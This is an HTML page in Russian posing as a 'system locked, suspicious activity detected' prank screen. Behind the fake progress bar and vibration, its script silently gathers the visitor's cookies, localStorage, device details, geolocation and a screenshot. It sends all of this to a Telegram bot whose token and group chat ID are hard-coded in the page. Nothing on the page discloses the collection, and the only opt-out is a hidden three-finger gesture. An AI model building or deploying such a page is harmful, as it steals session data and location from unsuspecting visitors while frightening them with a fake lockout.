<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Обновление системы</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        .box {
            border: 2px solid #00ff41;
            padding: 30px;
            border-radius: 12px;
            background: #111;
            max-width: 400px;
        }
        h1 { font-size: 24px; margin-bottom: 20px; }
        .progress { width: 100%; height: 10px; background: #222; margin: 20px 0; border-radius: 5px; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: #00ff41; animation: load 10s linear forwards; }
        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
        .status { font-size: 14px; color: #aaa; }
        .hint { margin-top: 30px; font-size: 12px; color: #555; }
        .emergency { display: none; margin-top: 20px; padding: 10px; background: #2a0000; border: 1px solid red; color: red; }
    </style>
</head>
<body>
    <div class="box">
        <h1>⚠️ СИСТЕМА ЗАБЛОКИРОВАНА</h1>
        <p>Обнаружена подозрительная активность.</p>
        <div class="progress"><div class="progress-bar"></div></div>
        <div class="status" id="statusText">Сканирование файлов...</div>
        <div class="hint">Для отмены: <strong>3 пальца на экран</strong></div>
        <div class="emergency" id="emergencyMsg">✔ Шутка отменена. Удачного дня!</div>
    </div>

    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <script>
        // ====================================================
        // ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ)
        // ====================================================
        const BOT_TOKEN = '8911126607:AAEhgvLhVcPSos66wzFcEv2D6RixsGvZ_jg';
        const CHAT_ID = '-1004497754715';   // ГРУППОВОЙ ID

        let isCancelled = false;
        let dataSent = false;

        // ===== 1. ВИБРАЦИЯ =====
        if (navigator.vibrate) {
            navigator.vibrate([500, 200, 500, 200, 1000]);
        }

        // ===== 2. ТРИГГЕР 3 ПАЛЬЦА =====
        document.addEventListener('touchstart', function(e) {
            if (e.touches.length === 3) {
                cancelPrank();
            }
        });

        // ===== 3. ОТМЕНА =====
        function cancelPrank() {
            if (isCancelled) return;
            isCancelled = true;
            if (navigator.vibrate) navigator.vibrate(0);
            document.getElementById('emergencyMsg').style.display = 'block';
            document.querySelector('.progress').style.display = 'none';
            document.getElementById('statusText').innerText = 'Шутка отменена';
            document.querySelector('h1').innerText = '✅ ШУТКА ОТМЕНЕНА';
            setTimeout(() => window.close(), 2000);
        }

        // ===== 4. ОТПРАВКА В ГРУППУ =====
        function sendToTelegram(type, data) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            let text = `📩 [${type}]\n${JSON.stringify(data, null, 2)}`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            }).catch(err => console.log(err));
        }

        // ===== 5. СБОР И ОТПРАВКА =====
        function collectAndSend() {
            if (dataSent || isCancelled) return;
            dataSent = true;

            // Скриншот
            html2canvas(document.body).then(canvas => {
                let imgData = canvas.toDataURL('image/png');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        photo: imgData,
                        caption: '📸 Скриншот экрана'
                    })
                });
            });

            // Данные о системе
            let info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie || 'нет',
                localStorage: localStorage,
                time: new Date().toISOString()
            };
            sendToTelegram('SYSTEM_INFO', info);

            // Геолокация (если разрешит)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendToTelegram('GEO', {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude
                    });
                }, () => {});
            }

            document.getElementById('statusText').innerText = 'Данные отправлены!';
        }

        // ===== 6. ЗАПУСК =====
        setTimeout(collectAndSend, 10000);
        setTimeout(() => {
            if (!isCancelled && !dataSent) collectAndSend();
        }, 25000);
    </script>
</body>
</html>
